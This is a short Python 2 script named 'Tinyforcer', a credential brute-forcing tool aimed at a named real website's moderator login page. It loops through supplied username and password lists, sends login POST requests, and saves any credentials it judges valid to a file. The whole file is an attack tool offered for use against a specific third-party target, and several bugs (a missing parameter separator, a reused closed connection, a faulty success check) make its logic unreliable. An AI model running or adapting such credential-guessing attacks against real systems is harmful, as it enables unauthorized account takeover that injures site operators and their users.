#!/usr/bin/env python
# -*- coding: utf-8 -*-

import socket
import os
import time

# Variables

HOST = "55chan.org"
PORT = 80 
PATH = "/mod.php"

contador1 = 0
contador2 = 0

# Functions

def connect_host():

  sockfd = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
  dest = (HOST,PORT)
  sockfd.connect(dest)
  return sockfd

def open_file(file):

  f = open(file,"r")
  data = f.read(2000)
  return data

def send(sockfd,user,password):

  parameters = "username=" + user + "password=" + password + "&login=Prosseguir"
  cabecalho = "POST " + PATH + " HTTP/1.1\r\n"  
  cabecalho += "Content-Type: application/x-www-form-urlencoded\r\n"  
  cabecalho += "Content-Length: " + str(len(parameters)) + "\r\n"
  cabecalho += "Host: " + HOST + " \r\n"
  cabecalho += "Connection: close\r\n"
  cabecalho += "\r\n"
  cabecalho += parameters

  sockfd.send(cabecalho)
  data = sockfd.recv(20000) 
  return data

def analyze(user,password,data):

 if data.find("senha inválido"):
     print "[-] Data Not found!!"
 else:
     var = "[+] User: %s" % user 
     var += "[+] pass: %s" % password  
     print var
     f = open("save.txt",'a')
     f.write(var)
     exit(0)

def banner():

   print \
   '''
     .--------.
    / .------. '
   / /        \ |
   | |        | |
  _| |________| |_
.' |_|        |_| '.
'._____ ____ _____.'  [X] Tinyforcer v1.0 
|     .'____'.     |  [X] Author: p3rsp3ct0
'.__.'.'    '.'.__.'
'.__  | YALE |  __.'
|   '.'.____.'.'   |
'.____'.____.'____.'
'.________________.'

   '''     

# Input 

os.system("clear")
banner()
usernames = str(raw_input("Logins: "))
passwords = str(raw_input("Passwords: "))

# Check

if os.path.exists(usernames) and os.path.exists(passwords):
   check1 = open_file(usernames)  
   check2 = open_file(passwords)
else:
   os.system("clear")
   banner()
   print "[-] Error, Failed to open file...\n"
   exit(0)


# Parse

check1 = check1.split("\n")
check2 = check2.split("\n")

# Connect

sockfd = connect_host()
os.system("clear")
banner()

# Bruteforce

while len(check1) - 1 > contador1:
   user = check1[contador1]
   while len(check2) - 1 > contador2:
        password = check2[contador2]
        print "Trying User: %s and password: %s" % (user , password)
        data = send(sockfd,user,password)
        analyze(user,password,data)
        contador2 += 1
        time.sleep(1)

   contador1 += 1
   contador2 = 0
